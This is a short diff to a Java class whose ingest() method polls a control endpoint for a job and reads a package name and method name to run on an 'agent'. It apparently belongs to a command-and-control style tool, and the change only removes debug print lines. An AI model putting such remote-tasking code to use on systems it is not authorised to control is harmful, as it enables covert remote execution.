@@ -36,21 +36,18 @@ public class Proc {
 	public static void ingest() throws ClassNotFoundException, NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, NoSuchAlgorithmException {
                 final Exception starterStackTrace = new Exception();
 		Hashtable agentDirective = Netw.send("Ctrl", null, Main.config.get("ctrlKey").toString(), Crypt.bake());
-                System.out.println(agentDirective);
 		if (agentDirective.containsKey("error")) {
 			return;
 		}
 		
 		String taskID = agentDirective.get("jobID").toString();
-                System.out.println(Main.taskManifest);
-                System.out.println(Main.schtasks);
+
  		if (!Main.taskManifest.contains(taskID) && !Main.schtasks.containsKey(taskID)) {
 			Main.taskManifest.add(taskID);
 			String pkgName = agentDirective.get("pkgName").toString();
 			String pkgMeth = agentDirective.get("pkgMeth").toString();
 			
 			if (Util.distant(pkgName) == 0) {
-                                System.out.println("class not on agent");
 				Hashtable errorTable = new Hashtable();
 				errorTable.put("status","complete");
 				errorTable.put("class",pkgName);
